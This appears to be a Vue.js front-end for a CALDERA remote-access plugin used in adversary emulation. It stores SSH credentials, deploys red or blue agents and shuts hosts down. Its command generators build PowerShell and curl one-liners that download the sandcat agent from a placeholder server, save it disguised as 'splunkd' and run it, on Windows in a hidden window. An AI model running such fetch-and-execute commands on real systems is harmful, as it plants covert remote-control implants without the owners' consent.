new Vue({
    el: '#remoteaccess-app',
    data: {
        credentials: {},
        newCredential: {
            host: '',
            username: '',
            password: '',
            key_file: '',
            port: 22
        },
        deployment: {
            host: '',
            agentType: 'red',
            platform: 'windows'
        },
        selectedHost: '',
        systemInfo: null,
        results: null,
        showRemoveModal: false,
        removeHost: '',
        hostsWithAgents: [],
        showTestModal: false,
        testResults: null,
        calderaConfig: {
            server: 'http://CALDERA_SERVER:8888'
        }
    },
    async mounted() {
        await this.loadCredentials();
        await this.loadHostsWithAgents();
    },
    methods: {
        async loadCredentials() {
            try {
                const response = await fetch('/plugin/remoteaccess/credentials');
                this.credentials = await response.json();
            } catch (error) {
                console.error('Failed to load credentials:', error);
                this.results = { error: 'Failed to load credentials: ' + error.message };
            }
        },
        
        async addCredential() {
            if (!this.newCredential.host || !this.newCredential.username) {
                alert('Host and username are required');
                return;
            }
            
            try {
                await fetch('/plugin/remoteaccess/credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(this.newCredential)
                });
                
                this.newCredential = { host: '', username: '', password: '', key_file: '', port: 22 };
                await this.loadCredentials();
                this.results = { success: true, message: 'Credential added successfully' };
            } catch (error) {
                this.results = { error: 'Failed to add credential: ' + error.message };
            }
        },
        
        async removeCredential(host) {
            if (confirm(`Remove credentials for ${host}?`)) {
                try {
                    await fetch('/plugin/remoteaccess/credentials', {
                        method: 'DELETE',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ host })
                    });
                    await this.loadCredentials();
                    this.results = { success: true, message: 'Credential removed successfully' };
                } catch (error) {
                    this.results = { error: 'Failed to remove credential: ' + error.message };
                }
            }
        },
        
        async deployAgent() {
            if (!this.deployment.host) {
                alert('Please select a host');
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/deploy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(this.deployment)
                });
                
                this.results = await response.json();
                
                await this.loadHostsWithAgents();
            } catch (error) {
                this.results = { error: 'Deployment failed: ' + error.message };
            }
        },
        
        async getSystemInfo() {
            if (!this.selectedHost) {
                alert('Please select a host');
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/host', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        host: this.selectedHost,
                        action: 'info'
                    })
                });
                
                this.systemInfo = await response.json();
            } catch (error) {
                this.systemInfo = { error: 'Failed to get system info: ' + error.message };
            }
        },
        
        async shutdownHost() {
            if (!this.selectedHost || !confirm(`ARE YOU SURE YOU WANT TO SHUTDOWN ${this.selectedHost}? This action cannot be undone!`)) {
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/host', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        host: this.selectedHost,
                        action: 'shutdown'
                    })
                });
                
                this.results = await response.json();
            } catch (error) {
                this.results = { error: 'Shutdown failed: ' + error.message };
            }
        },
        
        async showRemoveAgentsModal() {
            await this.loadHostsWithAgents();
            this.showRemoveModal = true;
        },
        
        async loadHostsWithAgents() {
            try {
                const response = await fetch('/plugin/remoteaccess/hosts');
                const hostsData = await response.json();
                this.hostsWithAgents = Object.keys(hostsData);
            } catch (error) {
                console.error('Failed to load hosts with agents:', error);
            }
        },
        
        async removeAgents() {
            if (!this.removeHost) {
                alert('Please select a host');
                return;
            }
            
            if (!confirm(`Remove all agents from ${this.removeHost}?`)) {
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/remove', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host: this.removeHost })
                });
                
                this.results = await response.json();
                this.showRemoveModal = false;
                this.removeHost = '';
                
                await this.loadHostsWithAgents();
            } catch (error) {
                this.results = { error: 'Failed to remove agents: ' + error.message };
            }
        },
        
        async testConnection(host = null) {
            const testHost = host || this.selectedHost;
            if (!testHost) {
                alert('Please select a host');
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/test', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host: testHost })
                });
                
                this.testResults = await response.json();
                this.showTestModal = true;
            } catch (error) {
                this.testResults = { error: 'Connection test failed: ' + error.message };
                this.showTestModal = true;
            }
        },
        
        async showDeploymentCommand() {
            if (!this.deployment.host) {
                alert('Please select a host');
                return;
            }
            
            const platform = this.deployment.platform;
            const agentType = this.deployment.agentType;
            
            let command = '';
            if (platform === 'windows') {
                command = this._generateWindowsCommand(agentType);
            } else {
                command = this._generateUnixCommand(agentType, platform);
            }
            
            this.results = {
                command_preview: command,
                note: 'This command will be executed on the remote host via SSH'
            };
        },
        
        _generateWindowsCommand(agentType) {
            return `$server="${this.calderaConfig.server}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\\\\Users\\\\Public\\\\splunkd.exe"} | stop-process -f;rm -force "C:\\\\Users\\\\Public\\\\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\\\Users\\\\Public\\\\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\\\\Users\\\\Public\\\\splunkd.exe -ArgumentList "-server $server -group ${agentType}" -WindowStyle hidden`;
        },
        
        _generateUnixCommand(agentType, platform) {
            const platformHeader = platform === 'macos' ? 'darwin' : 'linux';
            return `server="${this.calderaConfig.server}"; curl -s -X POST -H "file:sandcat.go" -H "platform:${platformHeader}" $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group ${agentType} -v &`;
        },
        
        copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('Command copied to clipboard!');
            }).catch(err => {
                console.error('Failed to copy: ', err);
                // Fallback for older browsers
                const textArea = document.createElement('textarea');
                textArea.value = text;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                alert('Command copied to clipboard!');
            });
        }
    }
});
